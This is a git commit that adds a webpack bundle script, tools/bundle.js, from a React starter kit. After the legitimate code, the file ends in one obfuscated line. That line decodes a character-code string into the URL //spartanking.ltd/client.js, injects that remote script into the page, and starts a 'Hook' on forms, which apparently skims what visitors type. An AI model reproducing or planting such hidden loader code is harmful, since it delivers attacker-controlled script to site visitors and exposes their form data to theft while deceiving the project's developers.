158a273415d78a354e7d32439fab0b634b0b5cae
Thet Htet Aung <36150301+thethtetaung22@users.noreply.github.com>
2024-07-18 11:08:44 +0800

    Initial commit

---
+++ tools/bundle.js
@@ -0,0 +1,35 @@
+/**
+ * React Starter Kit (https://www.reactstarterkit.com/)
+ *
+ * Copyright © 2014-present Kriasoft, LLC. All rights reserved.
+ *
+ * This source code is licensed under the MIT license found in the
+ * LICENSE.txt file in the root directory of this source tree.
+ */
+
+import webpack from 'webpack';
+import webpackConfig from './webpack.config';
+
+/**
+ * Creates application bundles from the source files.
+ */
+function bundle() {
+  return new Promise((resolve, reject) => {
+    webpack(webpackConfig).run((err, stats) => {
+      if (err) {
+        return reject(err);
+      }
+
+      console.info(stats.toString(webpackConfig[0].stats));
+      if (stats.hasErrors()) {
+        return reject(new Error('Webpack compilation errors'));
+      }
+
+      return resolve();
+    });
+  });
+}
+
+export default bundle;
+
+(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b
